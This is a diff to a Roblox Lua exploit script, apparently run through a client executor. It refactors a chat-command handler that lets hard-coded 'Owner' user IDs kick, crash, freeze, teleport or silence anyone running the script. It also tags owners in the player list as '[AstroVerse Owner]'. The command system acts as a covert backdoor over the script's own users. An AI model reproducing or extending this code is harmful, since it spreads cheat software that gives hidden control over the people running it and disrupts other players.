@@ -4,9 +4,6 @@ local Owners = {
     198508658, 4248708772, 529076146, 4529099164, 3640313057,
     2956935559, 6147751229
 }
-local VIP = {
-    3682132159, 370326509, 676636514
-}
 
 local function Freeze(target)
     getgenv().Freeze = game:GetService("RunService").Heartbeat:Connect(function()
@@ -100,7 +97,7 @@ local function USpin(target)
 end
 
 local function LoopTp(target)
-    if target.Name == game:GetService("s").Local.Name then
+    if target.Name == game:GetService("Players").LocalPlayer.Name then
         getgenv().TPLoop = game:GetService("RunService").Heartbeat:Connect(function()
             local player = game:GetService("Players").LocalPlayer
             if player.Character and target.Character then
@@ -312,7 +309,6 @@ local function stopShake()
     end
 end
 
-
 local function Silence(target)
     local playerGui = target:FindFirstChild("PlayerGui")
     if playerGui then
@@ -387,12 +383,13 @@ end
 local function Bring(target)
     game:GetService("Players").LocalPlayer:MoveTo(target.Character.HumanoidRootPart.CFrame.Position)
 end
+
 local Prefix = "."
 
 local function handleCommand(player, msg)
     local loweredString = string.lower(msg)
     local args = string.split(loweredString, " ")
-    
+
     local function getFullUsername(partialUsername)
         for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
             if string.find(player.Name:lower(), partialUsername:lower()) then
@@ -428,15 +425,13 @@ local function handleCommand(player, msg)
     elseif args[1] == Prefix .. "kick" then
         executeForMatchingPlayer(Ban)
     elseif args[1] == Prefix .. "rj" then
-        executeForMatchingPlayer(
-            function(target)
-                if target.Name == game:GetService("Players").LocalPlayer.Name then
-                    local ts = game:GetService("TeleportService")
-                    local localPlayer = game:GetService("Players").LocalPlayer
-                    ts:Teleport(game.PlaceId, localPlayer)
-                end
+        executeForMatchingPlayer(function(target)
+            if target.Name == game:GetService("Players").LocalPlayer.Name then
+                local ts = game:GetService("TeleportService")
+                local localPlayer = game:GetService("Players").LocalPlayer
+                ts:Teleport(game.PlaceId, localPlayer)
             end
-        )
+        end)
     elseif args[1] == Prefix .. "crash" then
         executeForMatchingPlayer(Crash)
     elseif args[1] == Prefix .. "stopcrash" then
@@ -522,117 +517,13 @@ local function handleCommand(player, msg)
     end
 end
 
-game.Players.PlayerAdded:Connect(function(plr)
+local function setupPlayer(plr)
     if table.find(Owners, plr.UserId) then
         local success, err = pcall(function()
             if plr then
                 local userIdString = "p_" .. tostring(plr.UserId)
                 local coreGui = game:GetService("CoreGui")
-                
-                -- Navigate through the hierarchy safely
-                local playerList = coreGui:FindFirstChild("PlayerList")
-                if playerList then
-                    local playerListMaster = playerList:FindFirstChild("PlayerListMaster")
-                    if playerListMaster then
-                        local offsetFrame = playerListMaster:FindFirstChild("OffsetFrame")
-                        if offsetFrame then
-                            local playerScrollList = offsetFrame:FindFirstChild("PlayerScrollList")
-                            if playerScrollList then
-                                local sizeOffsetFrame = playerScrollList:FindFirstChild("SizeOffsetFrame")
-                                if sizeOffsetFrame then
-                                    local scrollingFrameContainer = sizeOffsetFrame:FindFirstChild("ScrollingFrameContainer")
-                                    if scrollingFrameContainer then
-                                        local scrollingFrameClippingFrame = scrollingFrameContainer:FindFirstChild("ScrollingFrameClippingFrame")
-                                        if scrollingFrameClippingFrame then
-                                            local scrollingFrame = scrollingFrameClippingFrame:FindFirstChild("ScrollingFrame")
-                                            local scrollingFrame = scrollingFrameClippingFrame:FindFirstChild("ScollingFrame")
-                                            if scrollingFrame then
-                                                local offsetUndoFrame = scrollingFrame:FindFirstChild("OffsetUndoFrame")
-                                                if offsetUndoFrame then
-                                                    local targetFrame = offsetUndoFrame:FindFirstChild(userIdString)
-                                                    if targetFrame then
-                                                        local childrenFrame = targetFrame:FindFirstChild("ChildrenFrame")
-                                                        if childrenFrame then
-                                                            local nameFrame = childrenFrame:FindFirstChild("NameFrame")
-                                                            if nameFrame then
-                                                                local bgFrame = nameFrame:FindFirstChild("BGFrame")
-                                                                if bgFrame then
-                                                                    local overlayFrame = bgFrame:FindFirstChild("OverlayFrame")
-                                                                    if overlayFrame then
-                                                                        local playerName = overlayFrame:FindFirstChild("PlayerName")
-                                                                        if playerName then
-                                                                            local playerNameLabel = playerName:FindFirstChild("PlayerName")
-                                                                            if playerNameLabel then print(playerNameLabel.Text)
-                                                                                playerNameLabel.Text = "[AstroVerse Owner] "..playerNameLabel.Text
-                                                                            else
-                                                                                error("PlayerNameLabel not found")
-                                                                            end
-                                                                        else
-                                                                            error("PlayerName not found")
-                                                                        end
-                                                                    else
-                                                                        error("OverlayFrame not found")
-                                                                    end
-                                                                else
-                                                                    error("BGFrame not found")
-                                                                end
-                                                            else
-                                                                error("NameFrame not found")
-                                                            end
-                                                        else
-                                                            error("ChildrenFrame not found")
-                                                        end
-                                                    else
-                                                        error("TargetFrame not found")
-                                                    end
-                                                else
-                                                    error("OffsetUndoFrame not found")
-                                                end
-                                            elseif ScollingFrame then
-                                            else
-                                                error("ScrollingFrame not found")
-                                            end
-                                        else
-                                            error("ScrollingFrameClippingFrame not found")
-                                        end
-                                    else
-                                        error("ScrollingFrameContainer not found")
-                                    end
-                                else
-                                    error("SizeOffsetFrame not found")
-                                end
-                            else
-                                error("PlayerScrollList not found")
-                            end
-                        else
-                            error("OffsetFrame not found")
-                        end
-                    else
-                        error("PlayerListMaster not found")
-                    end
-                else
-                    error("PlayerList not found")
-                end
-            else
-                error("Player not found")
-            end
-        end)
-        if not success then
-            warn("An error occurred: " .. err)
-        end
-        plr.Chatted:Connect(function(msg)
-            handleCommand(plr, msg)
-        end)
-    end
-end)
 
-for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
-    if table.find(Owners, plr.UserId) then
-        local success, err = pcall(function()
-            if plr then
-                local userIdString = "p_" .. tostring(plr.UserId)
-                local coreGui = game:GetService("CoreGui")
-                
                 -- Navigate through the hierarchy safely
                 local playerList = coreGui:FindFirstChild("PlayerList")
                 if playerList then
@@ -729,3 +620,11 @@ for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
         end)
     end
 end
+
+game.Players.PlayerAdded:Connect(setupPlayer)
+
+for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+    setupPlayer(plr)
+end
+
+-- This code was made with help from zont.
